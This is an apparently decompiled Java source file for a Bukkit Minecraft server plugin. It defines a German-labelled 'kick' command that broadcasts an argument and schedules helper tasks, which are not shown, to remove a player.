package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_KICK extends CommandBase {

    public Command_KICK() {
        super("kick", "<Spieler> <Grund>" + " §d| " + ChatColor.GRAY + "Rauswerfen", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        Bukkit.broadcastMessage(args[1]);
        if (args.length == 2) {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_KICK2(this, args));
            } catch (Exception var5) {
                Bukkit.broadcastMessage(var5.getMessage());
            }
        } else {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_KICK3(this, args));
            } catch (Exception var4) {
                Bukkit.broadcastMessage(var4.getMessage());
            }
        }
    }

}
